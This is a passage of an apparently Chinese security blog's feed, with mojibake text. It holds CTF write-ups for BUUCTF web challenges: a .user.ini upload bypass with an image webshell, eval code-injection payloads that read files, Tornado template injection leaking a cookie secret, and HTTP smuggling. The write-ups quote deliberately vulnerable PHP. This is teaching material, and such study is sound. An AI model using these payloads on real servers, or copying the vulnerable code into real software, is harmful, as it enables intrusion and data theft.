class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚</p><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p>å‚è§å˜¶å¼ctf easy calc:<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc</a></p><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/6654#toc-4">https://xz.aliyun.com/t/6654#toc-4</a></p><p><a href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> httpèµ°ç§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfåˆ·é¢˜-æ–‡ä»¶ä¸Šä¼ ç¯‡</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†BUUCTFä¸Šwebé¢˜ä¸­æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„writeupï¼ŒæŒç»­æ›´æ–°ä¸­ï¼</p><a id="more"></a><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿäº†å¯¹<code>.user.ini</code>çš„ä½¿ç”¨</p><p>é—®é¢˜æ¥äº†ï¼Œä»€ä¹ˆæ˜¯<code>.user.ini</code>ï¼Ÿ</p><p>è¿™å¾—ä»php.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code>ã€‚</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/2014103002272568560.png"></p><p>åœ¨æ¨¡å¼ä¸ºPHP_INI_USERçš„é…ç½®é¡¹æåˆ°äº†.user.iniï¼Œé‚£ä¹ˆè¿™æ˜¯ä¸ªä»€ä¹ˆé…ç½®æ–‡ä»¶ï¼Ÿ</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009201030.png"></p><p>phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹ï¼ˆä¸‹å›¾ç¬¬ä¸€ã€å››ä¸ªï¼‰ï¼š</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/2014103002272554789.png"></p><p><code>auto_append_file</code>ã€<code>auto_prepend_file</code>è¿™ä¸¤ä¸ªé…ç½®æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</p><p><code>auto_prepend_file</code>çš„æ„æ€æ˜¯æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†<code>require()</code>å‡½æ•°ã€‚è€Œ<code>auto_append_file</code>ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­ï¼š</p><pre><code>auto_prepend_file=01.gif</code></pre><p>è¿™æ ·çš„æ´»åœ¨è®¿é—®åŒç›®å½•ä¸‹çš„.phpåç¼€çš„æ–‡ä»¶æ—¶å°±ä¼šæŠŠ01.gifåŒ…å«è¿›å»</p><p>æ‰€ä»¥ï¼Œ<code>.user.ini</code>çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š</p><ol><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li><li>æœåŠ¡å™¨ä½¿ç”¨<code>CGIï¼FastCGI</code>æ¨¡å¼</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ol><p>åºŸè¯å°‘è¯´ï¼Œå¼€å§‹è§£é¢˜ï¼</p><p>é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ª<code>.user.ini</code>æ–‡ä»¶</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009203302.png"></p><p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¸ºäº†æµ‹è¯•å…ˆå†™ä¸ª<code>phpinfo()</code></p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009203927.png"></p><p>è®¿é—®ç›®å½•ä¸‹çš„index.phpï¼ŒæˆåŠŸè¿”å›</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009204831.png"></p><p>ä¸Šä¼ ä¸€å¥è¯ï¼Œèšå‰‘è¿ï¼Œå‘ç°æ ¹ç›®å½•<code>/flag</code>ï¼ŒæˆåŠŸè§£é¢˜</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009205138.png"></p><p>BUUCTFä¸Šæœ‰æºç ,åˆ†æä¸€æ³¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">&quot;uploads/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, $extension)) &#123;        <span class="comment">//é»‘åå•ï¼Œå¯¹phå’Œhtacesså¿½ç•¥å¤§å°å†™è¿‡æ»¤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;        <span class="comment">//è¯»å–æ–‡ä»¶ï¼Œè¿‡æ»¤<span class="meta">&lt;?</span>,ç”¨&lt;script language=&#x27;php&#x27;&gt;&lt;script/&gt;ç»•è¿‡</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);        <span class="comment">//æ–‡ä»¶å¤´æ£€æµ‹ï¼ŒåŠ GIF89aç»•è¿‡</span></span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>æŸ¥çœ‹æºç å‘ç°å¯ä»¥ä¸Šä¼ ï¼Œå°†é¼ æ ‡ç§»åˆ°ä¸­é—´å°±å¯ä»¥ä¸Šä¼ äº†</p><p>å‰ç«¯æœ‰jsæ£€éªŒï¼Œç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬æ”¹åç¼€åï¼Œä¸Šä¼ phpå¯ä»¥å¤§å°å†™ï¼Œä½†ä¸èƒ½æˆåŠŸè§£æï¼Œphp3,php5ä¹Ÿä¸èƒ½è§£æ</p><p>æœ€åå‘ç°phtmlå¯ä»¥è§£æï¼Œgetshellååœ¨ä¸Šä¼ ä¸Šå±‚ç›®å½•å‘ç°<code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.phtml$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
            <tag> buuctf </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfåˆ·é¢˜-ä»£ç å‘½ä»¤æ³¨å…¥ç¯‡</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctfä¸Šwebéƒ¨åˆ†ä»£ç æ³¨å…¥å’Œå‘½ä»¤æ‰§è¡Œç›¸å…³é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ä¸­ï¼</p><a id="more"></a><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€æŸ¥çœ‹æºç å‘ç°æ˜¯é€šè¿‡GETè¯·æ±‚<code>calc.php</code>æ¥è·å–ç­”æ¡ˆçš„ï¼Œç›´æ¥è®¿é—®èƒ½çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å…ˆä»‹ç»ä¸€ä¸‹PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼ŒPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><ol><li>åˆ é™¤ç©ºç™½ç¬¦ </li><li>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</li></ol><p>ä»¥è¿™é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼ä¸‹é¢çš„payloadæ¥ç»•è¿‡wafï¼Œwafåœ¨å“ªï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ç”¨phpå†™çš„wafï¼Œæ‰¾äº†å¥½ä¹…æ²¡æ‰¾åˆ°ï¼Œåæ¥çœ‹å¤§ä½¬ä»¬çš„åšå®¢æ‰å‘ç°å¹¶ä¸æ˜¯</p><p>wafå¯èƒ½ä¸å…è®¸ä¼ é€’ä¼ é€’çš„numå‚æ•°çš„å€¼æœ‰å­—æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨<code>%20num</code>æ¥ä¼ é€’ï¼Œè¿™æ ·wafé‚£è¾¹è§£æçš„å°±æ˜¯<code>%20num</code>è¿™ä¸ªå‚æ•°ï¼Œè€Œåœ¨phpé‚£é‡Œè§£æçš„å°±æ˜¯<code>num</code>è¿™ä¸ªå‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%<span class="number">20</span>num=</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸‹flagæ–‡ä»¶ä½ç½®ï¼ŒæŸ¥çœ‹flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%<span class="number">20</span>num=var_dump(scandir(chr(<span class="number">47</span>)))<span class="comment">#æŸ¥çœ‹flagä½ç½®</span></span><br><span class="line">    </span><br><span class="line">calc.php?%<span class="number">20</span>num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))<span class="comment">#è¯»flag</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨æ— å‚æ•°å‡½æ•°æ¥æ„é€ payload</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200117001353.png" style="zoom:80%;"><p>è¿˜å¯ä»¥ç”¨httpèµ°ç§æ¥æ„é€ ï¼Œå…·ä½“å‚è§ï¼š<a href="https://www.moonback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/[](https://www.moonback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/)">https://www.moonback.xyz/2020/01/17/httpèµ°ç§å­¦ä¹ /[](https://www.moonback.xyz/2020/01/17/httpèµ°ç§å­¦ä¹ /)</a></p><p>æˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™ç§ï¼Œåœ¨è¯·æ±‚å¤´é‡ŒåŠ ä¸Šä¸‹é¢å†…å®¹ï¼Œå¹¶åŠ ä¸Šå‡ ä¸ªå›è½¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200120221923.png" style="zoom:67%;"><p>å‚è€ƒï¼š</p><p><a href="http://62.234.60.226/2019/10/19/RoarCTF-wp.html">http://62.234.60.226/2019/10/19/RoarCTF-wp.html</a></p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°ä¸‰ä¸ªæ–‡ä»¶ï¼Œ<code>flag.txt</code>æç¤ºflagåœ¨<code>/fllllllllllllag</code>ï¼Œ<code>welcome.txt</code>æç¤º<code>render</code>ï¼Œ<code>hints.txt</code>æç¤º<code>md5(cookie_secret+md5(filename))</code>ï¼Œç»“åˆé¢˜ç›®åå­—ï¼Œè”æƒ³åˆ°pythonä¸­çš„tornadoæ¡†æ¶renderæ¨¡æ¿æ³¨å…¥</p><p>cookie_secretå­˜æ”¾åœ¨handler.settingsä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¯»å–å‡ºcookie_secretï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200213122111.png" style="zoom:80%;"><p>å‘ç°æˆåŠŸè¯»å–åˆ°cookie_secretï¼ŒæŒ‰ç…§æç¤ºç»™çš„æ ¼å¼è¯»å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie_secret=<span class="string">&#x27;a33e0b4f-63b4-4ede-90b5-cc7bb45f48ca&#x27;</span>;</span><br><span class="line">$filename=<span class="string">&#x27;/fllllllllllllag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($cookie_secret.md5($filename));</span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®ï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;8089e3218f80b4c12a208cc0e9974d98</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> buuctf </tag>
            
